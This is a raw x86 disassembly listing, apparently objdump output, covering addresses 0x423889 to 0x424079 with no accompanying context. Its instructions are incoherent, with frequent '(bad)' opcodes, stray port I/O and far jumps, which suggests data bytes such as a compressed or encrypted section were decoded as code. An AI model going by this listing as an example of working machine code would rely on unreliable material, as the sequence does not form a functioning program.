  423889:	add    ecx,DWORD PTR es:[ebp+0x46]
  42388d:	stc    
  42388e:	mov    ebp,esp
  423890:	mov    WORD PTR [ecx+0x7cdfd302],es
  423896:	ss cmp eax,0xafac2201
  42389c:	jp     0x4238d0
  42389e:	jg     0x4238a7
  4238a0:	fs push ecx
  4238a2:	adc    eax,0x3f7a769e
  4238a7:	adc    dl,BYTE PTR [edx]
  4238a9:	xchg   ebp,eax
  4238aa:	enter  0xb6ee,0x15
  4238ae:	push   ebx
  4238af:	(bad)  
  4238b0:	repnz xor al,0xa8
  4238b3:	cwde   
  4238b4:	imul   ecx,DWORD PTR [esi-0x3],0x2f1d7220
  4238bb:	pusha  
  4238bc:	jecxz  0x423858
  4238be:	add    BYTE PTR [edx+0x426a9f03],cl
  4238c4:	ret    
  4238c5:	lea    edi,[edx]
  4238c7:	push   ss
  4238c8:	lods   al,BYTE PTR ds:[esi]
  4238c9:	dec    ebx
  4238ca:	iret   
  4238cb:	mov    eax,esp
  4238cd:	js     0x4238bf
  4238cf:	imul   ebp,DWORD PTR [edx+0x50],0xbd672abb
  4238d6:	xor    al,0x7a
  4238d8:	push   0xfe938ac5
  4238dd:	push   ecx
  4238de:	cmp    al,0x81
  4238e0:	add    DWORD PTR [esi],edi
  4238e2:	adc    BYTE PTR [ecx+0x56],bh
  4238e5:	mov    dh,0xe5
  4238e7:	retf   0x38d
  4238ea:	sbb    eax,0xffffff98
  4238ed:	fisub  WORD PTR [eax]
  4238ef:	in     eax,0xce
  4238f1:	xchg   edx,eax
  4238f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4238f3:	rcr    DWORD PTR [edi],0x52
  4238f6:	add    cl,bl
  4238f8:	retf   0xa8c6
  4238fb:	bound  esp,QWORD PTR [ebx-0xb694211]
  423901:	or     eax,0x128a2371
  423906:	push   0xffffffae
  423908:	jmp    0x423924
  42390a:	imul   DWORD PTR [edi-0x2f]
  42390d:	mov    esi,0x51387af8
  423912:	and    DWORD PTR [ecx+0x3fb3f863],edx
  423918:	gs in  al,dx
  42391a:	mov    esp,0x50c461f5
  42391f:	mov    eax,ds:0xe038dbee
  423924:	push   esi
  423925:	xlat   BYTE PTR ds:[ebx]
  423926:	xchg   DWORD PTR [edi+0x4f],esi
  423929:	add    BYTE PTR [eax],ch
  42392b:	call   0x8f0a:0xf752efe0
  423932:	dec    esi
  423933:	or     edx,DWORD PTR [eax+0x65e0adf8]
  423939:	fild   DWORD PTR [ebx+eiz*4]
  42393c:	mov    edi,0xbe7a550d
  423941:	mov    al,0xd
  423943:	sbb    DWORD PTR [ebx],esi
  423945:	jo     0x423961
  423947:	add    DWORD PTR [ecx+0x5e],ecx
  42394a:	mov    ebx,0x8dd1a543
  42394f:	bound  eax,QWORD PTR [ebx-0x6734fb2e]
  423955:	mov    cl,0x29
  423957:	rol    BYTE PTR es:[edi+0x459f3e69],1
  42395e:	xlat   BYTE PTR ds:[ebx]
  42395f:	fs mov ebp,0xb259bbae
  423965:	or     DWORD PTR [edx],esi
  423967:	push   ecx
  423968:	int3   
  423969:	inc    edi
  42396a:	fstp   QWORD PTR [ebx]
  42396c:	dec    edx
  42396d:	(bad)  
  42396e:	adc    BYTE PTR [edx+ebp*8-0x513ca1f3],cl
  423975:	test   DWORD PTR [ecx+0x5fa8b4c5],esi
  42397b:	mov    ecx,DWORD PTR [esi+eiz*8-0x6c543964]
  423982:	daa    
  423983:	xchg   ebp,eax
  423984:	sub    eax,0x42808c71
  423989:	xchg   edi,eax
  42398a:	sahf   
  42398b:	lods   eax,DWORD PTR ds:[esi]
  42398c:	xor    al,0x10
  42398e:	jp     0x423941
  423990:	jge    0x4239fd
  423992:	mov    bh,BYTE PTR [ecx]
  423994:	push   eax
  423995:	jg     0x4239a8
  423997:	mov    al,0x2d
  423999:	push   esp
  42399a:	shl    edx,cl
  42399c:	rcr    edx,cl
  42399e:	inc    edi
  42399f:	dec    ebx
  4239a0:	loop   0x4239cc
  4239a2:	adc    al,0x4d
  4239a4:	shr    BYTE PTR [ebx],1
  4239a6:	in     eax,0x32
  4239a8:	jnp    0x42398b
  4239aa:	cmp    DWORD PTR [esi+eax*8],ebp
  4239ad:	add    eax,0x5a65610a
  4239b2:	rol    BYTE PTR [ecx-0x56],cl
  4239b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4239b6:	or     edi,DWORD PTR [ebx-0x5d]
  4239b9:	push   ebx
  4239ba:	dec    edx
  4239bb:	sbb    DWORD PTR [edx-0x5c],0xffffffde
  4239bf:	sub    DWORD PTR [eax+0x33],0x732c5ee0
  4239c6:	imul   eax,eax,0xb7abb329
  4239cc:	lods   eax,DWORD PTR ds:[esi]
  4239cd:	mov    edx,ebp
  4239cf:	xchg   esp,eax
  4239d0:	cld    
  4239d1:	sub    ah,BYTE PTR [eax+0x11]
  4239d4:	mov    ebx,0x95ac464c
  4239d9:	sbb    eax,0xba30b334
  4239de:	sub    ecx,DWORD PTR ds:0x7da12227
  4239e4:	rcl    DWORD PTR [edx+0x18],1
  4239e7:	pop    es
  4239e8:	mov    bh,0x65
  4239ea:	xchg   DWORD PTR [edx+0x56a47e87],edi
  4239f0:	xchg   esp,eax
  4239f1:	outs   dx,BYTE PTR ds:[esi]
  4239f2:	mov    cl,0xc3
  4239f4:	into   
  4239f5:	mov    dh,0x53
  4239f7:	sar    BYTE PTR [ebp+ebp*4-0x42],cl
  4239fb:	cmp    edx,edx
  4239fd:	aad    0x37
  4239ff:	xchg   esp,eax
  423a00:	jae    0x423a18
  423a02:	or     esi,edi
  423a04:	and    al,0xbb
  423a06:	jns    0x4239c6
  423a08:	es pop eax
  423a0a:	pop    ecx
  423a0b:	fist   DWORD PTR [ebx]
  423a0d:	cmp    edi,ecx
  423a0f:	test   eax,0xc46f005d
  423a14:	ins    DWORD PTR es:[edi],dx
  423a15:	ins    DWORD PTR es:[edi],dx
  423a16:	test   eax,0x5e10fc39
  423a1b:	retf   0x8f23
  423a1e:	rcr    ecx,cl
  423a20:	push   ss
  423a21:	mov    cl,0x8c
  423a23:	scas   al,BYTE PTR es:[edi]
  423a24:	xchg   dh,bh
  423a26:	test   bl,0x58
  423a29:	and    ah,0x49
  423a2c:	xchg   ebp,eax
  423a2d:	jmp    0x3ba2:0x46bfe331
  423a34:	sub    al,0x3f
  423a36:	or     DWORD PTR [ecx+0x7656a53c],esi
  423a3c:	mov    dl,0x4f
  423a3e:	pop    edi
  423a3f:	(bad)
  423a43:	sub    cl,al
  423a45:	mov    dl,0xc6
  423a47:	adc    BYTE PTR [ebx+edi*4-0x67],0x88
  423a4c:	loop   0x423a5d
  423a4e:	and    edx,DWORD PTR cs:[edx+eax*4]
  423a52:	jmp    0x423a64
  423a54:	test   al,0x1d
  423a56:	and    eax,0x8b3e54ee
  423a5b:	lahf   
  423a5c:	pcmpeqd mm1,QWORD PTR ds:0x4bd3c2aa
  423a63:	inc    edx
  423a64:	sub    BYTE PTR [eax+0x3571754d],cl
  423a6a:	xchg   DWORD PTR [edx-0x2c],eax
  423a6d:	aas    
  423a6e:	or     bl,BYTE PTR ds:0x5d0c1bed
  423a74:	and    bh,BYTE PTR [ecx+0x77da1cba]
  423a7a:	xor    eax,0x769c2922
  423a7f:	test   BYTE PTR [ebx],cl
  423a81:	je     0x423af4
  423a83:	lock mov eax,ds:0x7593ccb7
  423a89:	dec    esi
  423a8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423a8b:	outs   dx,DWORD PTR ds:[esi]
  423a8c:	enter  0x7bfc,0x7a
  423a90:	shl    BYTE PTR [ebp-0x20],cl
  423a93:	pushf  
  423a94:	sar    ah,cl
  423a96:	ds nop
  423a98:	leave  
  423a99:	xlat   BYTE PTR ds:[ebx]
  423a9a:	ins    DWORD PTR es:[edi],dx
  423a9b:	sub    BYTE PTR ds:0xedc41a90,0x9a
  423aa2:	call   0x3aeb:0xc8af4254
  423aa9:	pop    ss
  423aaa:	sti    
  423aab:	ss or  eax,0x4a6035b5
  423ab1:	jp     0x423b03
  423ab3:	pushf  
  423ab4:	or     dl,BYTE PTR [edi+0x689b87d0]
  423aba:	inc    eax
  423abb:	sar    BYTE PTR ds:0xb9a326df,0xa
  423ac2:	mov    eax,ds:0xa0cfe3b6
  423ac7:	in     eax,dx
  423ac8:	in     al,0xf5
  423aca:	ret    
  423acb:	sbb    dl,BYTE PTR [ebp+0x4974ecdb]
  423ad1:	imul   esi,DWORD PTR [ebx],0xf5cea778
  423ad7:	cmc    
  423ad8:	sub    eax,0x50b99bc6
  423add:	int3   
  423ade:	push   ebp
  423adf:	cmp    al,0x75
  423ae1:	jnp    0x423ad8
  423ae3:	jecxz  0x423aff
  423ae5:	jns    0x423b5f
  423ae7:	mov    edx,0x15c2ac59
  423aec:	cmp    ah,BYTE PTR [eax]
  423aee:	sahf   
  423aef:	in     al,dx
  423af0:	fdivr  st,st(5)
  423af2:	jmp    0xc854465
  423af7:	push   cs
  423af8:	sti    
  423af9:	outs   dx,DWORD PTR ds:[esi]
  423afa:	test   BYTE PTR [ebp+0x76],ch
  423afd:	enter  0x168c,0x84
  423b01:	or     BYTE PTR [eax-0x47],ah
  423b04:	jno    0x423b3e
  423b06:	loop   0x423b27
  423b08:	add    eax,DWORD PTR [ebx+0x51]
  423b0b:	lods   al,BYTE PTR ds:[esi]
  423b0c:	or     al,0xcc
  423b0e:	aaa    
  423b0f:	push   ecx
  423b10:	fldcw  WORD PTR [eax+0x7d]
  423b13:	fwait
  423b14:	loop   0x423b21
  423b16:	(bad)  
  423b17:	push   ecx
  423b18:	fisttp DWORD PTR [ecx+edx*2-0x6425a49e]
  423b1f:	outs   dx,BYTE PTR ds:[esi]
  423b20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423b21:	cs stos DWORD PTR es:[edi],eax
  423b23:	or     ch,ah
  423b25:	gs mov ecx,ebx
  423b28:	ins    DWORD PTR es:[edi],dx
  423b29:	dec    esp
  423b2a:	dec    ecx
  423b2b:	inc    ebp
  423b2c:	daa    
  423b2d:	inc    ebp
  423b2e:	fld    QWORD PTR ds:0x3b3b5839
  423b34:	xor    eax,0x45e6f385
  423b39:	sahf   
  423b3a:	daa    
  423b3b:	out    dx,al
  423b3c:	ins    DWORD PTR es:[edi],dx
  423b3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423b3e:	pop    edx
  423b3f:	fs add al,0x1e
  423b42:	cmp    al,0x12
  423b44:	xlat   BYTE PTR ds:[ebx]
  423b45:	sub    al,0xcb
  423b47:	loop   0x423aeb
  423b49:	mov    bh,0x14
  423b4b:	xlat   BYTE PTR ds:[ebx]
  423b4c:	clc    
  423b4d:	push   ds
  423b4e:	ret    
  423b4f:	sub    esi,DWORD PTR [ecx-0x51]
  423b52:	jg     0x423b4b
  423b54:	mov    bh,0x1a
  423b56:	mov    esp,0x370f26ab
  423b5b:	call   0x1c7f19ca
  423b60:	dec    edx
  423b61:	jns    0x423b38
  423b63:	sub    esp,edi
  423b65:	(bad)  
  423b66:	out    0x29,eax
  423b68:	xor    BYTE PTR [edi],0x75
  423b6b:	adc    DWORD PTR [esi+0x6a],esi
  423b6e:	sar    DWORD PTR [esi+0x72],1
  423b71:	cs jecxz 0x423b30
  423b74:	test   eax,0x53f96bf8
  423b79:	cmp    eax,0x2d8d79a0
  423b7e:	xchg   DWORD PTR [eax-0x29e95cf8],edx
  423b84:	repnz xor bl,cl
  423b87:	lds    ecx,FWORD PTR [eax-0x4c]
  423b8a:	iret   
  423b8b:	xor    bh,bl
  423b8d:	sub    al,0x7c
  423b8f:	add    al,0x38
  423b91:	mov    bh,0xd8
  423b93:	out    0xc4,eax
  423b95:	(bad)  
  423b96:	aas    
  423b97:	mov    eax,ds:0x4acc4cc7
  423b9c:	adc    edi,0x1
  423b9f:	pusha  
  423ba0:	mov    WORD PTR [eax],?
  423ba2:	push   edx
  423ba3:	les    edx,FWORD PTR [eax+0x15]
  423ba6:	hlt    
  423ba7:	pop    eax
  423ba8:	cmp    BYTE PTR [ecx],dl
  423baa:	mov    dh,0x97
  423bac:	mov    dl,0xaa
  423bae:	pushf  
  423baf:	cdq    
  423bb0:	sbb    bh,0x7b
  423bb3:	sbb    al,0x21
  423bb5:	sti    
  423bb6:	push   esp
  423bb7:	mov    fs,WORD PTR [edx]
  423bb9:	retf   
  423bba:	adc    al,0xd1
  423bbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423bbd:	call   0x6a2b:0x7a191143
  423bc4:	or     ecx,esp
  423bc6:	dec    esi
  423bc7:	mov    cl,0x62
  423bc9:	sbb    ah,BYTE PTR [ecx+0x64]
  423bcc:	enter  0x28a0,0x1a
  423bd0:	and    BYTE PTR [ebp+eiz*2-0x54],ah
  423bd4:	dec    ebx
  423bd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423bd6:	mov    esp,0xc375bab3
  423bdb:	out    dx,eax
  423bdc:	cmp    dl,BYTE PTR [edx]
  423bde:	fadd   QWORD PTR [ebp-0x370fca40]
  423be4:	push   edx
  423be5:	jecxz  0x423c11
  423be7:	xchg   DWORD PTR [esi+0x51d4d285],ecx
  423bed:	lods   eax,DWORD PTR ds:[esi]
  423bee:	into   
  423bef:	pushf  
  423bf0:	sub    eax,0x1ad2115c
  423bf5:	sbb    bl,cl
  423bf7:	cmp    al,0xed
  423bf9:	xor    cl,al
  423bfb:	sub    ebp,DWORD PTR [ecx]
  423bfd:	pop    es
  423bfe:	in     al,dx
  423bff:	mov    ebp,0x831717b1
  423c04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423c05:	clc    
  423c06:	mov    esi,0x89cad937
  423c0b:	enter  0x99c5,0x84
  423c0f:	test   esi,ebx
  423c11:	push   0x5b8e45ce
  423c16:	leave  
  423c17:	int    0x68
  423c19:	xchg   esi,eax
  423c1a:	mov    BYTE PTR [edx-0x6],dh
  423c1d:	bound  esi,QWORD PTR ds:0xdd15e4aa
  423c23:	and    bh,BYTE PTR [edx+0x2c5020c1]
  423c29:	sahf   
  423c2a:	pusha  
  423c2b:	pop    ss
  423c2c:	fs xchg edx,eax
  423c2e:	leave  
  423c2f:	or     eax,0x2a9c5d43
  423c34:	push   ss
  423c35:	push   ss
  423c36:	or     esp,ecx
  423c38:	icebp  
  423c39:	stos   DWORD PTR es:[edi],eax
  423c3a:	and    ch,0x6b
  423c3d:	outs   dx,DWORD PTR ds:[esi]
  423c3e:	in     al,0xb3
  423c40:	(bad)  
  423c41:	loop   0x423bdd
  423c43:	fimul  DWORD PTR [ebp-0x320b7086]
  423c49:	inc    edi
  423c4a:	mov    dl,0xf5
  423c4c:	outs   dx,BYTE PTR ds:[esi]
  423c4d:	pop    esi
  423c4e:	sahf   
  423c4f:	cs mov bl,0x1b
  423c52:	xchg   ebx,eax
  423c53:	adc    al,0x36
  423c55:	dec    ecx
  423c56:	test   DWORD PTR [edi+edx*1+0x53c56309],0x7ef506ea
  423c61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423c62:	rol    ah,1
  423c64:	fisttp DWORD PTR [eax+0x2e704301]
  423c6a:	mov    ds:0x2d552bf9,eax
  423c6f:	jge    0x423cc1
  423c71:	or     eax,0x629cb843
  423c76:	loopne 0x423c64
  423c78:	mov    dl,0x11
  423c7a:	call   0x3314:0xad8a8838
  423c81:	adc    dl,0x72
  423c84:	loop   0x423c51
  423c86:	or     eax,0x6a200f09
  423c8b:	jmp    0x3bfccc93
  423c90:	test   eax,0xd2f8544e
  423c95:	test   BYTE PTR [ebx-0x2c989624],0xe9
  423c9c:	cmp    BYTE PTR [eax+esi*4],dl
  423c9f:	or     eax,0xc8b79ae8
  423ca4:	call   0x5849:0xc4cbd3cb
  423cab:	shl    bl,cl
  423cad:	lea    ebp,[esi]
  423caf:	sub    edx,DWORD PTR [edi+0x2]
  423cb2:	ret    
  423cb3:	mov    ds:0x67929370,al
  423cb8:	fs push 0xf8916cd9
  423cbe:	add    DWORD PTR [edi],edi
  423cc0:	inc    eax
  423cc1:	add    bl,BYTE PTR [edi-0x58428d0a]
  423cc7:	test   edx,edi
  423cc9:	mov    ah,0xc7
  423ccb:	inc    esi
  423ccc:	jle    0x423d1c
  423cce:	cmovne edx,ecx
  423cd1:	mov    ds:0x1b448e4d,eax
  423cd6:	jno    0x423d29
  423cd8:	cmp    al,0xc9
  423cda:	je     0x423cae
  423cdc:	cs inc eax
  423cde:	jno    0x423cb1
  423ce0:	int3   
  423ce1:	aad    0xee
  423ce3:	cli    
  423ce4:	cmp    al,0xfd
  423ce7:	test   ecx,edi
  423ce9:	repnz es push es
  423cec:	int    0x5a
  423cee:	xor    BYTE PTR [edi-0x2c9b8deb],ch
  423cf4:	jb     0x423d0c
  423cf6:	jp     0x423ca0
  423cf8:	jbe    0x423d40
  423cfa:	lods   al,BYTE PTR ds:[esi]
  423cfb:	add    edx,DWORD PTR [edi+0x67]
  423cfe:	xor    BYTE PTR [eax-0x70],dl
  423d01:	inc    BYTE PTR [esi-0x48]
  423d04:	inc    edi
  423d05:	mov    dx,0xc94d
  423d09:	lds    eax,FWORD PTR [edi]
  423d0b:	jmp    0x2665:0x5867d664
  423d12:	icebp  
  423d13:	and    eax,0xc23af271
  423d18:	push   cs
  423d19:	mov    edi,0x929fca54
  423d1e:	mov    al,ds:0xd08b407f
  423d23:	or     ecx,DWORD PTR [eax-0x39affd98]
  423d29:	xchg   ebx,eax
  423d2a:	test   dl,0xbe
  423d2d:	ja     0x423d3f
  423d2f:	push   ebp
  423d30:	sub    eax,0x48edb4ca
  423d35:	mov    ebx,0x28f3533e
  423d3a:	and    BYTE PTR [ebx],dh
  423d3c:	jne    0x423ceb
  423d3e:	in     eax,0x82
  423d40:	xchg   ebp,eax
  423d41:	jp     0x423cd2
  423d43:	mov    eax,ds:0x4c300c34
  423d48:	and    eax,0xeb294b57
  423d4d:	popa   
  423d4e:	je     0x423d15
  423d50:	mul    BYTE PTR [edi-0x74]
  423d53:	neg    BYTE PTR [ecx+0x18da454b]
  423d59:	shl    BYTE PTR [edx],0x90
  423d5c:	mov    ah,0x2b
  423d5e:	retf   0x6329
  423d61:	pop    esp
  423d62:	ss test eax,0x6f874124
  423d68:	mov    cl,ch
  423d6a:	cmp    BYTE PTR [ebp-0x66c85c3d],cl
  423d70:	rol    BYTE PTR [ebx+0x7edfe900],cl
  423d76:	ins    DWORD PTR es:[edi],dx
  423d77:	jp     0x423d9f
  423d79:	repz out dx,al
  423d7b:	retf   
  423d7c:	hlt    
  423d7d:	pop    eax
  423d7e:	rol    BYTE PTR [ebp-0x255df035],0x30
  423d85:	arpl   WORD PTR [esi+0x736e8463],sp
  423d8b:	fs out 0xdc,al
  423d8e:	cmp    al,0x2
  423d90:	xchg   esp,eax
  423d91:	dec    edx
  423d92:	mov    dl,0x7b
  423d94:	sbb    bh,BYTE PTR [edx+0x42ed3773]
  423d9a:	rcl    BYTE PTR [edx+0x429db1db],0xa5
  423da1:	and    edi,DWORD PTR [eax-0x3b9217c0]
  423da7:	sbb    ecx,esp
  423da9:	pop    ebx
  423daa:	dec    eax
  423dab:	jg     0x423d8d
  423dad:	sbb    BYTE PTR [ebx+eax*4+0x110ef896],bl
  423db4:	add    al,0x1e
  423db6:	sbb    dh,ch
  423db8:	addr16 pop es
  423dba:	mov    dl,0xce
  423dbc:	shl    DWORD PTR [edi],cl
  423dbe:	xor    BYTE PTR [ecx],al
  423dc0:	aas    
  423dc1:	outs   dx,DWORD PTR ds:[esi]
  423dc2:	in     al,dx
  423dc3:	pop    ebp
  423dc4:	rcl    esi,0x4b
  423dc7:	pop    ebx
  423dc8:	pop    ecx
  423dc9:	out    dx,al
  423dca:	mov    eax,?
  423dcc:	int    0x7f
  423dce:	pop    ds
  423dcf:	dec    eax
  423dd0:	mov    esi,0x87cbc03c
  423dd5:	inc    ebp
  423dd6:	pop    esp
  423dd7:	ins    DWORD PTR es:[edi],dx
  423dd8:	xor    al,0x2f
  423dda:	adc    ch,dl
  423ddc:	pop    ss
  423ddd:	retf   
  423dde:	(bad)  
  423ddf:	mov    ds:0x446c360a,eax
  423de4:	es dec edx
  423de6:	es add ebx,0x46
  423dea:	sbb    BYTE PTR [ebx],ch
  423dec:	cmp    dh,bl
  423dee:	push   esp
  423def:	pop    edi
  423df0:	sbb    al,0xa4
  423df2:	inc    eax
  423df3:	enter  0x475a,0xda
  423df7:	push   ebp
  423df8:	out    0xc3,eax
  423dfa:	dec    esp
  423dfb:	iret   
  423dfc:	and    eax,0xb9c28306
  423e01:	(bad)  
  423e02:	jmp    0x423e2d
  423e04:	add    dl,cl
  423e06:	sar    dh,1
  423e08:	std    
  423e09:	rol    DWORD PTR [edi-0x4b],0x76
  423e0d:	pop    ss
  423e0e:	ret    
  423e0f:	pop    edi
  423e10:	inc    ecx
  423e11:	cmp    bl,bh
  423e13:	and    DWORD PTR [eax],ecx
  423e15:	push   0xffffff92
  423e17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423e18:	aas    
  423e19:	rcl    BYTE PTR [esp+eax*2-0x4cffb42d],1
  423e20:	mov    ch,0xc5
  423e22:	(bad)  
  423e23:	mov    ch,bh
  423e25:	jb     0x423e27
  423e27:	sbb    edi,DWORD PTR [edi-0x4e]
  423e2a:	lahf   
  423e2b:	pop    ecx
  423e2c:	xchg   edi,eax
  423e2d:	in     al,dx
  423e2e:	xor    dl,BYTE PTR [ecx+0x852b32e]
  423e34:	fsub   QWORD PTR [ebx+edx*4]
  423e37:	arpl   WORD PTR [edx],sp
  423e39:	cli    
  423e3a:	rcr    BYTE PTR [ebx-0x5f],cl
  423e3d:	cli    
  423e3e:	std    
  423e3f:	stc    
  423e40:	sbb    DWORD PTR [ebp+0x182efec3],esp
  423e46:	cld    
  423e47:	adc    eax,0x5d2d7e52
  423e4c:	add    ecx,DWORD PTR [edi-0x7c]
  423e4f:	mov    ah,0xa1
  423e51:	lods   eax,DWORD PTR ds:[esi]
  423e52:	arpl   WORD PTR [edx+edi*2+0x55],bp
  423e56:	ficom  DWORD PTR [edi]
  423e58:	enter  0x8a19,0x2
  423e5c:	cmp    esi,esp
  423e5e:	call   0x61ec:0x519e86a7
  423e65:	pop    ebx
  423e66:	or     edx,esp
  423e68:	enter  0x3e03,0x4c
  423e6c:	xchg   BYTE PTR [edx+0x61165150],dh
  423e72:	outs   dx,DWORD PTR ds:[esi]
  423e73:	push   ss
  423e74:	pop    ecx
  423e75:	loope  0x423e88
  423e77:	int3   
  423e78:	push   ax
  423e7a:	lds    eax,FWORD PTR [ecx]
  423e7c:	(bad)  
  423e7e:	adc    DWORD PTR [esi-0x61bda034],eax
  423e84:	cmc    
  423e85:	mov    dh,0xbb
  423e87:	je     0x423e66
  423e89:	jbe    0x423ecf
  423e8b:	sub    ah,BYTE PTR [ebx]
  423e8d:	dec    esp
  423e8e:	xchg   edi,eax
  423e8f:	xchg   ebx,eax
  423e90:	fldcw  WORD PTR [ecx]
  423e92:	test   BYTE PTR [ebp+0x3643c98c],dh
  423e98:	(bad)  
  423e99:	mov    ecx,0x82a4ff08
  423e9e:	test   al,0x56
  423ea0:	out    dx,al
  423ea1:	mov    eax,0xe1aac842
  423ea6:	rcl    DWORD PTR [ebp-0x662bf9c9],0xf9
  423ead:	pop    ecx
  423eae:	push   ebx
  423eaf:	inc    esi
  423eb0:	(bad)  
  423eb1:	xchg   esp,eax
  423eb2:	nop
  423eb3:	mov    esp,0xee55d65f
  423eb8:	stc    
  423eb9:	xchg   edx,eax
  423eba:	enter  0xc393,0xd6
  423ebe:	(bad)  
  423ebf:	xchg   ecx,eax
  423ec0:	sbb    al,0xa2
  423ec2:	dec    esi
  423ec3:	xchg   BYTE PTR [edx+0x123c836b],dl
  423ec9:	jl     0x423ef6
  423ecb:	add    dh,BYTE PTR [esi+ebx*1]
  423ece:	dec    esp
  423ecf:	test   BYTE PTR [esi-0xeb68c33],al
  423ed5:	inc    edi
  423ed6:	sahf   
  423ed7:	clc    
  423ed8:	jbe    0x423e93
  423eda:	in     al,0x7d
  423edc:	hlt    
  423edd:	sub    eax,DWORD PTR [ecx+0x53e50e42]
  423ee3:	add    al,0x97
  423ee5:	ret    0x88c7
  423ee8:	push   eax
  423ee9:	xor    BYTE PTR [esp+edx*4+0x2f6adffe],ch
  423ef0:	lods   eax,DWORD PTR ds:[esi]
  423ef1:	outs   dx,BYTE PTR ds:[esi]
  423ef2:	add    esi,esp
  423ef4:	add    bh,BYTE PTR [edi+0x96e0916]
  423efa:	dec    ebx
  423efb:	lahf   
  423efc:	lea    edi,[ecx+ebp*4]
  423eff:	pop    ss
  423f00:	bound  esp,QWORD PTR [edx]
  423f02:	cwde   
  423f03:	inc    ebp
  423f04:	and    edx,DWORD PTR [esp+eiz*4]
  423f07:	push   edx
  423f08:	ins    BYTE PTR es:[edi],dx
  423f09:	cmp    eax,0x9a0e7bbc
  423f0e:	dec    edi
  423f0f:	in     al,dx
  423f10:	(bad)  
  423f11:	cmp    esi,eax
  423f13:	aas    
  423f14:	push   edi
  423f15:	js     0x423f93
  423f17:	into   
  423f18:	pop    eax
  423f19:	pop    esp
  423f1a:	and    ecx,DWORD PTR [ebx+0x73]
  423f1d:	clc    
  423f1e:	inc    BYTE PTR [edx+0x50b10945]
  423f24:	loop   0x423f5f
  423f26:	in     al,dx
  423f27:	xadd   DWORD PTR [edi],esp
  423f2a:	or     esp,esi
  423f2c:	dec    esp
  423f2d:	es add eax,0x4975cb61
  423f33:	inc    esp
  423f34:	(bad)  
  423f35:	cdq    
  423f36:	push   ecx
  423f37:	(bad)  
  423f38:	jecxz  0x423f5c
  423f3a:	xor    al,0xc2
  423f3c:	fsub   QWORD PTR [edi-0x7c]
  423f3f:	sbb    ecx,DWORD PTR [edx+0x2556f4b0]
  423f45:	pop    ecx
  423f46:	mov    edx,0xd0cf3ff1
  423f4b:	pop    ebx
  423f4c:	clc    
  423f4d:	(bad)  
  423f4e:	std    
  423f4f:	push   0xd14d4ad5
  423f54:	and    al,0xca
  423f56:	push   0x415bf513
  423f5b:	add    eax,DWORD PTR [eax]
	...
  423fa5:	add    BYTE PTR [edi-0x73],dl
  423fa8:	popa   
  423fa9:	jle    0x423fa6
  423fab:	(bad)  
  423fac:	pop    edi
  423fad:	lods   eax,DWORD PTR ds:[esi]
  423fae:	into   
  423faf:	fisttp DWORD PTR [edx+0x58]
  423fb2:	xchg   ebp,eax
  423fb3:	lds    ebx,FWORD PTR [esi+0xf]
  423fb6:	jg     0x423fe7
  423fb8:	add    DWORD PTR [eax],eax
  423fba:	push   ds
  423fbb:	pop    es
  423fbc:	add    BYTE PTR [eax],al
  423fbe:	outs   dx,BYTE PTR ds:[esi]
  423fbf:	test   dl,ah
  423fc1:	xchg   ecx,eax
  423fc2:	or     al,0xe9
  423fc4:	xchg   edi,eax
  423fc5:	sub    ebp,DWORD PTR [esi+0x4c]
  423fc8:	sbb    ebx,DWORD PTR [esp+ebx*2+0x7637f69]
  423fcf:	add    edi,DWORD PTR [esi]
  423fd1:	ins    DWORD PTR es:[edi],dx
  423fd2:	sub    eax,0x93b498d1
  423fd7:	inc    esi
  423fd8:	out    dx,al
  423fd9:	stc    
  423fda:	xor    BYTE PTR [edx+0x78],bl
  423fdd:	inc    esp
  423fde:	js     0x423f91
  423fe0:	cwde   
  423fe1:	jecxz  0x42401a
  423fe3:	push   esp
  423fe4:	test   BYTE PTR [eax-0x7e49c5e6],ch
  423fea:	xlat   BYTE PTR ds:[ebx]
  423feb:	push   edi
  423fec:	imul   DWORD PTR [esi-0x4efb302b]
  423ff2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423ff3:	xchg   edi,eax
  423ff4:	sbb    al,0x4c
  423ff6:	jbe    0x423fac
  423ff8:	retf   
  423ff9:	mov    ebp,0x9b445aaf
  423ffe:	arpl   bx,bx
  424000:	mov    WORD PTR [ebx-0x3cf7e11c],ds
  424006:	jno    0x42402f
  424008:	popa   
  424009:	push   ecx
  42400a:	and    al,0x30
  42400c:	aad    0x29
  42400e:	sub    DWORD PTR [eax+0x4014e8b],ebx
  424014:	mov    ds:0x7d5592c2,eax
  424019:	push   ebp
  42401a:	outs   dx,BYTE PTR ds:[esi]
  42401b:	gs ret 0x2e56
  42401f:	(bad)  
  424020:	cli    
  424021:	cmp    BYTE PTR [edx+ebp*2+0x4ff38c68],cl
  424028:	rcl    DWORD PTR [ebp-0x3a],cl
  42402b:	mov    bl,bl
  42402d:	icebp  
  42402e:	mov    ds:0xe7aaa657,eax
  424033:	xchg   esi,eax
  424034:	mov    BYTE PTR [edi],0x34
  424037:	enter  0x7bfc,0x4d
  42403b:	pop    esp
  42403c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42403d:	in     eax,0x88
  42403f:	push   ebx
  424040:	sub    BYTE PTR [ecx+0x71],dh
  424043:	push   cs
  424044:	mul    BYTE PTR ds:0x1e734060
  42404a:	(bad)  
  42404b:	jle    0x424065
  42404d:	stc    
  42404e:	cld    
  42404f:	push   eax
  424050:	popf   
  424051:	out    0xfd,eax
  424053:	add    al,0x99
  424055:	or     al,0xb3
  424057:	cmp    DWORD PTR [ebp-0x6dcccbb1],ebx
  42405d:	mov    ebx,0xe62fdbb1
  424062:	pusha  
  424063:	test   BYTE PTR [edx+0x77c70841],bl
  424069:	sbb    ecx,DWORD PTR [ebx]
  42406b:	xchg   DWORD PTR [ebx],eax
  42406d:	pop    esi
  42406e:	push   ebp
  42406f:	in     eax,0xdb
  424071:	mov    edx,0xeb6e17d
  424076:	dec    ebx
  424077:	fwait
  424078:	fwait
  424079:	js     0x424030
